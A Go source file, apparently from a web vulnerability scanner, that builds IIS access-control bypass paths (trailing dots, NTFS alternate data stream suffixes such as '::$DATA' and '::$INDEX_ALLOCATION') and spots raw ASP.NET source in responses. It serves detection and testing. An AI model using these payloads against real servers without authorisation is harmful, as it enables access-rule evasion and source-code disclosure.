package iis_extension_confusion_bypass

import "strings"

// scriptExtensions are server-side script files whose raw source IIS will hand
// over when addressed through the NTFS ::$DATA alternate data stream instead of
// executing them.
var scriptExtensions = []string{
	".aspx", ".asmx", ".ashx", ".asax", ".asa", ".asp", ".cshtml", ".vbhtml", ".master",
}

// sourceMarkers indicate that a response body is raw server-side source rather
// than executed output. IIS strips these directives before serving a rendered
// page, so their presence means we received the unprocessed file.
var sourceMarkers = []string{
	"<%@ page", "<%@ control", "<%@ webservice", "<%@ application", "<%@ master",
	"<%@ import", "<%@ assembly", "<script runat=\"server\"", "runat=\"server\"",
	"codebehind=", "codefile=", "inherits=", "<%@ webhandler",
}

// isScriptPath reports whether path targets a server-side script file.
func isScriptPath(path string) bool {
	p := strings.ToLower(path)
	if i := strings.IndexAny(p, "?#"); i >= 0 {
		p = p[:i]
	}
	for _, ext := range scriptExtensions {
		if strings.HasSuffix(p, ext) {
			return true
		}
	}
	return false
}

// hasSourceMarkers reports whether body looks like raw server-side source.
func hasSourceMarkers(body string) bool {
	low := strings.ToLower(body)
	for _, m := range sourceMarkers {
		if strings.Contains(low, m) {
			return true
		}
	}
	return false
}

// sourceVectorSuffixes are appended to a script path to request its raw bytes
// via the NTFS default data stream. One entry suffices: NTFS stream names and
// IIS request filtering both match case-insensitively.
var sourceVectorSuffixes = []string{
	"::$DATA",
}

// applyAccessShape rewrites a forbidden path into an IIS-specific bypass form.
// Returns the candidate path, a human label, and whether the shape applies.
// The transform is deterministic given (path, shape) so the same shape can be
// re-applied to a decoy path for the catch-all negative control.
func applyAccessShape(path string, shape int) (candidate, label string, ok bool) {
	isDir := strings.HasSuffix(path, "/")
	trimmed := strings.TrimRight(path, "/")
	if trimmed == "" {
		return "", "", false
	}

	switch shape {
	case 0: // trailing dot — IIS strips it, evading a rule bound to the exact path
		if isDir {
			return trimmed + "./", "trailing-dot", true
		}
		return path + ".", "trailing-dot", true
	case 1: // URL-encoded trailing dot
		if isDir {
			return trimmed + "%2e/", "encoded-trailing-dot", true
		}
		return path + "%2e", "encoded-trailing-dot", true
	case 2: // NTFS ADS: treat the segment as a directory index
		return trimmed + "::$INDEX_ALLOCATION/", "index-allocation-ads", true
	case 3: // NTFS ADS via the $i30 index attribute
		return trimmed + ":$i30:$INDEX_ALLOCATION/", "i30-index-allocation-ads", true
	}
	return "", "", false
}

// numAccessShapes is the count of shapes applyAccessShape understands.
const numAccessShapes = 4

// pathExt returns the extension of the last path segment (with leading dot),
// used to build structurally-similar decoy paths.
func pathExt(path string) string {
	p := path
	if i := strings.IndexAny(p, "?#"); i >= 0 {
		p = p[:i]
	}
	p = strings.TrimRight(p, "/")
	base := p
	if i := strings.LastIndexByte(p, '/'); i >= 0 {
		base = p[i+1:]
	}
	if d := strings.LastIndexByte(base, '.'); d > 0 {
		return base[d:]
	}
	return ""
}
